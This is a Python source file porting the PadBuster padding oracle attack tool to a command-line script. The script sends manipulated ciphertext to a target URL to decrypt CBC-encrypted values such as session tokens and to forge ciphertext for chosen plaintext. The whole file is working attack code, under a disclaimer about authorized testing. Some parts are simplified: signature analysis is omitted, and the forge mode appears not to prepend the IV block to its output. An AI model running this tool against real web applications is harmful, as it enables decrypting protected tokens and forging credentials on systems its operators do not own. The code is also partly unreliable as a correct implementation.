# This script is a Python port of "PadBuster v0.3.3," originally by
# Brian Holyfield - Gotham Digital Science (labs@gdssecurity.com).
#
# Credits:
#   - J.Rizzo and T.Duong for web exploit techniques
#   - S.Vaudenay for initial padding oracle discovery
#   - James M. Martin for PoC brute force code
#   - wireghoul (Eldar Marcussen) for code improvements
#
# Disclaimer:
#   This is for demonstration and authorized testing only. Use responsibly!

"""
PadBuster-like Python script
----------------------------
Replicates core Padding Oracle logic:
  1) Decrypt mode: 
       - Splits ciphertext into blocks 
       - Derives intermediary bytes via block-by-block attacks
       - XORs with the preceding block (or IV) to produce plaintext
  2) Encrypt (forge) mode:
       - Reverses the process to create valid ciphertext for new plaintext
       - Derives intermediary bytes for a known/fake block
       - XOR with plaintext to form a new ciphertext block

Important: This script is only a reference skeleton—some parts (POST data, cookies, interactive prompts) 
are simplified or omitted. Adapt for your environment.
"""

import sys
import math
import argparse
import requests
import urllib.parse
import base64
from collections import defaultdict

def banner():
    print("+-------------------------------------------+")
    print("| PadBuster - v0.3.3 (Python Port)          |")
    print("| Written originally by Brian Holyfield     |")
    print("| Python conversion by whisprer & friends   |")
    print("+-------------------------------------------+\n")

class PadBuster:
    def __init__(
        self,
        url: str,
        encrypted_sample: str,
        block_size: int,
        error_string: str = None,
        encoding_format: int = 0,
        verbose: bool = False,
        log_files: bool = False,
        no_iv: bool = False,
        no_encode_option: bool = False,
        plaintext: str = None
    ):
        self.url = url
        self.sample = encrypted_sample
        self.block_size = block_size
        self.error_string = error_string
        self.encoding_format = encoding_format
        self.verbose = verbose
        self.log_files = log_files
        self.no_iv = no_iv
        self.no_encode_option = no_encode_option
        self.plaintext = plaintext  # If provided, triggers encrypt/forge mode

        self.raw_cipher_bytes = b""  # Decoded ciphertext bytes
        self.oracle_signature = None
        self.analysis_responses = defaultdict(int)
        self.request_count = 0

        # Decode/prepare the ciphertext sample
        self.decode_sample()

    # ----------------------------------------------------------------
    # UTILS: Decoding / Encoding
    # ----------------------------------------------------------------
    def decode_sample(self):
        """Decode the provided sample from URL encoding + chosen format, optionally prepend zero IV."""
        tmp = self.sample
        if '%' in tmp or '+' in tmp:  # Possibly URL-encoded
            tmp = urllib.parse.unquote(tmp)

        self.raw_cipher_bytes = self.my_decode(tmp.encode('ascii'), self.encoding_format)

        if len(self.raw_cipher_bytes) % self.block_size != 0:
            print(f"[!] ERROR: The sample length must be multiple of blockSize={self.block_size}.")
            print(f"    Got length={len(self.raw_cipher_bytes)}. Check encoding or block size.")
            sys.exit(1)

        if self.no_iv:
            # If user says "no-iv," artificially prepend a zero block
            self.raw_cipher_bytes = (b"\x00" * self.block_size) + self.raw_cipher_bytes

    def my_encode(self, data: bytes, fmt: int) -> bytes:
        return self.encode_decode(data, 'encode', fmt)

    def my_decode(self, data: bytes, fmt: int) -> bytes:
        return self.encode_decode(data, 'decode', fmt)

    def encode_decode(self, data: bytes, operation: str, fmt: int) -> bytes:
        """
        0=Base64, 1=HexLower, 2=HexUpper, 3=.NET UrlToken, 4=WebSafe Base64
        operation='encode' or 'decode'
        """
        if operation == 'decode':
            if fmt in [1, 2]:  # hex
                text = data.decode('ascii').lower()
                return bytes.fromhex(text)
            elif fmt == 3:  # .NET UrlToken
                return self.web64_decode(data.decode('ascii'), net=True)
            elif fmt == 4:  # WebSafe
                return self.web64_decode(data.decode('ascii'), net=False)
            else:
                # Base64 default
                return base64.b64decode(data)
        else:
            # encode
            if fmt in [1, 2]:  # hex
                hex_str = data.hex()
                if fmt == 2:
                    hex_str = hex_str.upper()
                return hex_str.encode('ascii')
            elif fmt == 3:  # .NET UrlToken
                return self.web64_encode(data, net=True)
            elif fmt == 4:  # WebSafe
                return self.web64_encode(data, net=False)
            else:
                # Base64
                return base64.b64encode(data).replace(b"\n", b"")

    def web64_encode(self, raw_data: bytes, net: bool) -> bytes:
        """net=False => Web64 style, net=True => .NET UrlToken style (appends count of '=')."""
        b64 = base64.b64encode(raw_data).decode('ascii')
        b64 = b64.replace('+', '-').replace('/', '_')
        eq_count = b64.count('=')
        b64 = b64.replace('=', '')
        if net:
            b64 += str(eq_count)
        return b64.encode('ascii')

    def web64_decode(self, enc_str: str, net: bool) -> bytes:
        tmp = enc_str.replace('-', '+').replace('_', '/')
        if net:
            eq_count = tmp[-1]
            tmp = tmp[:-1]
            tmp += '=' * int(eq_count)
        return base64.b64decode(tmp)

    @staticmethod
    def pretty_print(data: bytes) -> str:
        """Helper to show ASCII-friendly representation."""
        try:
            return data.decode('ascii', errors='replace')
        except:
            return repr(data)

    # ----------------------------------------------------------------
    # MAIN REQUEST/ORACLE CHECK
    # ----------------------------------------------------------------
    def make_request(self, test_url: str):
        """
        Minimal GET request using 'test_url'.
        The script replaces the sample in the URL with manipulated ciphertext.
        """
        self.request_count += 1
        try:
            resp = requests.get(test_url, allow_redirects=False, timeout=10)
            return (resp.status_code, resp.text, resp.headers.get("Location", "N/A"), len(resp.text))
        except requests.RequestException as e:
            print(f"[!] Request error: {e}")
            return (0, "", "N/A", 0)

    def build_signature(self, status, content_length, location, content):
        # For brevity, ignoring body or partial content. 
        return f"{status}\t{content_length}\t{location}"

    def is_successful(self, status_code, content, location, content_length) -> bool:
        """
        Check if the request is a 'success' (no padding error).
        1) If we have self.error_string, it's a success if that string is not in the content
        2) If we have self.oracle_signature, it's a success if the signature differs
        3) Otherwise, in analysis mode, we treat it as a 'fail' until we pick a signature
        """
        if self.error_string:
            return (self.error_string not in content)
        elif self.oracle_signature:
            sig_data = self.build_signature(status_code, content_length, location, content)
            return (sig_data != self.oracle_signature)
        else:
            # In 'analysis mode' or no known error, assume fail
            return False

    # ----------------------------------------------------------------
    # Decryption Mode
    # ----------------------------------------------------------------
    def run_decrypt_mode(self):
        total_len = len(self.raw_cipher_bytes)
        block_count = total_len // self.block_size

        if block_count < 2:
            print("[!] ERROR: Not enough blocks to decrypt (need at least 2). Use --no-iv if needed.")
            sys.exit(1)

        print("[+] Starting Decrypt Mode\n")
        decrypted_full = b""

        # The first block is considered IV; we decrypt from block 1..(block_count-1)
        for blk_i in range(1, block_count):
            print(f"[***] Decrypting Block {blk_i} of {block_count - 1}")
            sample_block = self.raw_cipher_bytes[blk_i * self.block_size : (blk_i + 1) * self.block_size]
            intermediary = self.process_block(sample_block)

            prev_block = self.raw_cipher_bytes[(blk_i - 1) * self.block_size : blk_i * self.block_size]
            decrypted_block = bytes(x ^ y for x, y in zip(intermediary, prev_block))

            print(f"   Decrypted Block (HEX): {self.my_encode(decrypted_block, 2).decode('ascii')}")
            print(f"   Decrypted Block (ASCII): {self.pretty_print(decrypted_block)}\n")
            decrypted_full += decrypted_block

        # Display final
        print("[+] Completed Decryption\n")
        print(f"[+] Full Decrypted Value (HEX)   : {self.my_encode(decrypted_full, 2).decode('ascii')}")
        print(f"[+] Full Decrypted Value (Base64): {self.my_encode(decrypted_full, 0).decode('ascii')}")
        print(f"[+] Full Decrypted Value (ASCII) : {self.pretty_print(decrypted_full)}")

    # ----------------------------------------------------------------
    # The core routine for discovering Intermediary bytes
    # ----------------------------------------------------------------
    def process_block(self, target_block: bytes) -> bytes:
        """
        Attempt to find 'intermediary' for each byte in 'target_block'
        using a fake preceding block. 
        """
        block_size = self.block_size
        fake_block = bytearray(block_size)
        intermediary = bytearray(block_size)

        # If no known error_string or oracle_signature, 
        # we might do 'analysis' to figure out the signature first (omitted for brevity).

        for pos in reversed(range(block_size)):
            pad_val = block_size - pos
            found_correct = False
            for guess in range(256):
                fake_block[pos] = guess

                # Adjust known discovered bytes for next padding
                for k in range(pos + 1, block_size):
                    fake_block[k] = intermediary[k] ^ pad_val

                combined = bytes(fake_block) + target_block
                encoded = self.my_encode(combined, self.encoding_format)
                if not self.no_encode_option:
                    encoded = urllib.parse.quote(encoded.decode('ascii'), safe='').encode('ascii')

                test_url = self.url.replace(self.sample, encoded.decode('ascii'), 1)
                status, content, loc, c_len = self.make_request(test_url)

                if self.is_successful(status, content, loc, c_len):
                    # The correct guess
                    val = guess ^ pad_val
                    intermediary[pos] = val
                    found_correct = True
                    if self.verbose:
                        print(f"  Byte {pos}: guess={guess}, Intermediary={val}")
                    break

            if not found_correct:
                print(f"[!] WARNING: Could not find correct byte at position {pos}. Using zero.")
                intermediary[pos] = 0

        return bytes(intermediary)

    # ----------------------------------------------------------------
    # Encryption/Forging Mode
    # ----------------------------------------------------------------
    def run_encrypt_mode(self, plaintext: bytes):
        """
        Reverse the padding oracle to produce a valid ciphertext for arbitrary plaintext.
        1. Pad the plaintext
        2. For each block (backwards), discover 'intermediary' for a known or fake block
        3. XOR with plaintext block => final ciphertext block
        """
        bs = self.block_size
        pad_len = bs - (len(plaintext) % bs)
        if pad_len == 0:
            pad_len = bs
        padded = plaintext + bytes([pad_len]) * pad_len
        total_blocks = math.ceil(len(padded) / bs)

        print(f"[+] Plaintext length {len(plaintext)}, padded to {len(padded)} => {total_blocks} blocks.\n")

        forged_cipher = b""
        # Start with a zero block or user-provided 'cipher' block if that was an option
        current_block = b"\x00" * bs

        # For each plaintext block from last to first
        for i in range(total_blocks, 0, -1):
            print(f"[***] Encrypting Block {i} of {total_blocks}")
            start = (i - 1) * bs
            end = i * bs
            pt_block = padded[start:end]

            # Derive intermediary for the current_block
            # This is your "sample block" in the original code
            interm = self.process_block(current_block)

            # XOR with the plaintext block => new cipher block
            new_cipher_block = bytes(x ^ y for x, y in zip(interm, pt_block))
            forged_cipher = new_cipher_block + forged_cipher

            print(f"   [Block {i}] newCipherBlock (HEX): {self.my_encode(new_cipher_block, 2).decode('ascii')}")
            current_block = new_cipher_block

        final_encoded = self.my_encode(forged_cipher, self.encoding_format)
        if not self.no_encode_option:
            final_encoded = urllib.parse.quote(final_encoded.decode('ascii'), safe='').encode('ascii')

        return final_encoded

def main():
    banner()

    parser = argparse.ArgumentParser(description="PadBuster-like script in Python with encryption forging mode.")
    parser.add_argument("--url", required=True, help="Target URL containing the ciphertext")
    parser.add_argument("--encrypted-sample", required=True, help="Encrypted sample that also appears in the request")
    parser.add_argument("--block-size", type=int, required=True, help="Block size (e.g. 16 for AES)")
    parser.add_argument("--error", help="Padding error string if known")
    parser.add_argument("--encoding", type=int, default=0,
                        help="0=Base64,1=HexLower,2=HexUpper,3=.NET UrlToken,4=WebSafe B64")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    parser.add_argument("--log", action="store_true", help="Enable file logging (not fully implemented)")
    parser.add_argument("--no-iv", action="store_true", help="Sample does not contain IV (prepend zeros)")
    parser.add_argument("--no-encode", action="store_true", help="Do not URL-encode the manipulated ciphertext")
    parser.add_argument("--plaintext", help="If provided, run in 'encrypt/forge' mode with given plaintext")
    args = parser.parse_args()

    padbuster = PadBuster(
        url=args.url,
        encrypted_sample=args.encrypted_sample,
        block_size=args.block_size,
        error_string=args.error,
        encoding_format=args.encoding,
        verbose=args.verbose,
        log_files=args.log,
        no_iv=args.no_iv,
        no_encode_option=args.no_encode,
        plaintext=args.plaintext
    )

    if padbuster.plaintext:
        # ENCRYPT (Forge) Mode
        print("[+] Running 'Encrypt Mode' to forge ciphertext.")
        forged = padbuster.run_encrypt_mode(padbuster.plaintext.encode('ascii'))
        print(f"\n[=] Final Forged Cipher: {forged.decode('ascii')}")
    else:
        # DECRYPT Mode
        print("[+] Running 'Decrypt Mode'.\n")
        padbuster.run_decrypt_mode()

if __name__ == "__main__":
    main()
